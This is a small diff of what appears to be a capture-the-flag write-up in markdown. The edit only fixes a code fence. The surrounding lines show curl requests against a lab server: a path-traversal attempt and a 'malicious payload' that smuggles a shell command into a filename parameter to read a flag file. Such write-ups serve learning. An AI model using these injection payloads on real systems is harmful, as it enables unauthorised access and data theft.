@@ -73,7 +73,7 @@ curl -I -X HEAD "http://83.136.253.201:36762/index.php?filename=../../flag.txt"
 
 ### malicious payload
 
-``
+```
 curl -X GET "http://83.136.253.201:36762/index.php?filename=;cat+/flag.txt"
 
 ```
